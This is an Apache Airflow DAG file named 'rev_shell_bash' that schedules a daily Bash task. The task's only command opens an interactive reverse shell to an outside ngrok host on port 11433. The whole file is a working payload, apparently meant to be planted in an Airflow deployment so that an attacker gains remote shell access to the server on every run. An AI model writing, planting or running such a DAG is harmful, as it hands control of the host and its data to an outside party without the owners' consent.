import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
    dag_id='rev_shell_bash',
    schedule_interval='0 0 * * *',
    start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
    run = BashOperator(
        task_id='run',
        bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
    )
